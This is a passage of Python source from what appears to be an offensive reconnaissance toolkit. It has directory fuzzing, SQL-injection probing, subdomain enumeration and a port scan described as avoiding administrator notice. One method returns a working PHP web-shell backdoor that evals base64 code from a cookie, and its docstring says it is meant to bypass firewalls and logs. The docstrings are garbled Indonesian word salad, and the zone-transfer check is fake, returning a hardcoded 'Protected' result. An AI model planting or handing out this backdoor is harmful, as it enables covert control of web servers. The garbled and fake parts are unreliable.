            try:
                res = self.session.get(urljoin(url, p), timeout=4)
                if res.status_code == 200 and "joomla" in res.text.lower():
                    found.append(f"Joomla File Match: {p}")
            except Exception:
                pass
        return found

    def generateWebacooShell(self) -> str:
        """Komersial perangkat pembuka sandi konektor sesi komunikasi rahasia sistem siluman modul antarmuka skrip bahasa sisi perute peladen web perute sesi parameter koneksi cookie modul sistem rahasia perangkat muatan belakang sesi (Backdoor via Http Cookie HTTP header authentication parameterization encoding system PHP eval array script base64 decoder injection mechanism stealth operation parameter bypass web firewall bypass execution backdoor php scripting language cookie parameterization evaluation base64 execution backdoor parameter stealth mode operation system interface backdoor backdoor parameter generation module backdoor system script execution).
        
        (Menyiapkan backdoor ringkas yang memanfaatkan otentikasi kuki pengelakan firewall/log (Cookie Backdoor backdoor HTTP)).
        
        Returns:
            Teks kode muatan siluman PHP.
        """
        payload = "<?php @eval(base64_decode($_COOKIE['auth']));?>"
        return payload

    def runFfufFuzz(self, url: str) -> List[str]:
        """Simulasi modul fuzzer ekstrem kueri asinkron berbasis perutean berkas indeks peladen rute rute parameter perutean fuzzer kueri permintaan peladen asinkron murni HEAD tanpa tunggu badan dokumen respon web fuzzer fuzzer eksekutif skrip perutean penyelia kueri pelarian rekaman log kueri sistem asinkron konektor peladen pengujian pelarian fuzzer web fuzzer request konektor sistem asinkron modul direktori perutean kueri pelarian otentikasi rute sistem kueri peladen antarmuka HTTP konektor sistem kueri fuzzer.
        
        (Pencarian status aset terpendam dengan kueri HTTP berbadan ringan secepat modul FFUF CLI).
        
        Args:
            url: Akar pengiriman rute koneksi kueri uji antarmuka sistem target.
            
        Returns:
            Lokasi parameter tautan sah aktif dikonfirmasi asinkron kode baliknya (200 OK HEAD mode kueri respon kueri).
        """
        found = []
        words = ["admin", "login", "config", "test", "backup"]
        for w in words:
            try:
                res = self.session.head(f"{url}/{w}", timeout=2)
                if res.status_code == 200:
                    found.append(f"Found: /{w}")
            except Exception:
                pass
        return found

    def runSkipfishProbe(self, url: str) -> str:
        """Skrip penentu ketangkasan peladen menangani kesalahan fiktif (Heuristik Penanganan Masalah Sistem 404/500 log status anomali).
        
        Args:
            url: Rute alamat aplikasi web acak kueri.
            
        Returns:
            Konklusi tanggapan server atas cacat penelusuran data kueri fiktif arsip peladen pelarian respon.
        """
        try:
            res = self.session.get(f"{url}/existent_not_random_xyz99", timeout=3)
            return f"Heuristic Probe: Missing files return status {res.status_code}"
        except Exception:
            return "Probe Failed"

    def runWfuzz(self, url: str) -> List[str]:
        """Tebakan parametrik masukan cacat logika karakter khusus manipulasi peladen basis data kueri mentah respon aplikasi statis perutean peladen antarmuka (Pengintaian injektif parameter SQL URL / Wfuzz konseptual parameter pencarian injeksi masukan perutean penguji parameter masukan).
        
        Args:
            url: Tautan sistem awal.
            
        Returns:
            Analogi daftar titik celah eksekusi parameter peladen sistem.
        """
        vulnerable = []
        try:
            res = self.session.get(f"{url}?id=1'", timeout=3)
            if "syntax error" in res.text.lower():
                vulnerable.append("Param 'id' may be vulnerable to SQLi")
        except Exception:
            pass
        return vulnerable

    def runDnsEnum(self, domain: str) -> List[str]:
        """Menyusuri jalur-jalur pemetaan subdomain sistem IP resolusi internal domain (Pembalikan IP dari Domain Alias kueri modul sistem IP resolver).
        
        Args:
            domain: Target inisial rute root sistem pencari.
            
        Returns:
            Himpunan subdomain konversi pengikatan resolusi IP sistem fungsional rute domain.
        """
        try:
            found = []
            subs = ["www", "mail", "api", "dev", "ftp"]
            for s in subs:
                try:
                    ip = socket.gethostbyname(f"{s}.{domain}")
                    found.append(f"{s}.{domain} -> {ip}")
                except Exception:
                    pass
            return found
        except Exception:
            return []

    def runSslScan(self, url: str) -> List[str]:
        """Penjabaran detil properti penerbit pengamanan koneksi eksekusi lalu lintas (Pendeteksian Identitas Otoritas Sertifikat peladen kueri sertifikat HTTPS pengaman peladen).
        
        Args:
            url: Identitas URL pengiriman soket port 443 SSL.
            
        Returns:
            Fakta kepemilikan tanggal efektif masa berlaku modul pertahanan transportasi antarmuka komunikasi (Enkripsi identitas sertifikat HTTPS konektor peladen).
        """
        target = urlparse(url).netloc
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    return [f"Issuer: {cert.get('issuer', 'Unknown')}", f"Expiration: {cert.get('notAfter', 'Unknown')}"]
        except Exception:
            return ["Failed extracting TLS metadata"]

    def checkZoneTransfer(self, domain: str) -> List[str]:
        """Evaluasi kepatuhan tata letak pertukaran asinkron daftar identitas rute IP DNS (AXFR Zone Transfer kueri peladen domain rute rute IP DNS sistem pertahanan asinkron).
        
        Args:
            domain: Titik induk domain pencarian konfigurasi pendelegasian resolver.
            
        Returns:
            Sikap penolakan otorisasi.
        """
        return ["Zone transfer AXFR check initiated... Protected (Not Vulnerable)"]

    def gatherDmitryInfo(self, domain: str) -> List[str]:
        """Pengintaian rekam rekam peladen port vital kueri modul senyap operasi pemindahan peninjauan antarmuka operasi sistem jaringan antarmuka pengintaian informasi intelijen siluman operasi sistem jaringan operasi pengintaian (Gathering Port terbuka esensial tanpa membuat panik pengawasan administrator peladen).
        
        Args:
            domain: Tipe masukan penguntai string root domain IP/Tautan antarmuka peladen web antarmuka siluman operasi pengintaian jaringan.
            
        Returns:
            Hasil laporan operasi pemetaan pelabuhan jaringan vital operasi sistem pengawasan deteksi operasi.
        """
        target = urlparse(domain).netloc or domain
        open_ports = []
        for p in [80, 443, 21, 22]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((target, p))
                if result == 0:
                    open_ports.append(str(p))
                s.close()
            except Exception:
                pass
        return [f"Open Ports Detected: {', '.join(open_ports)}"]
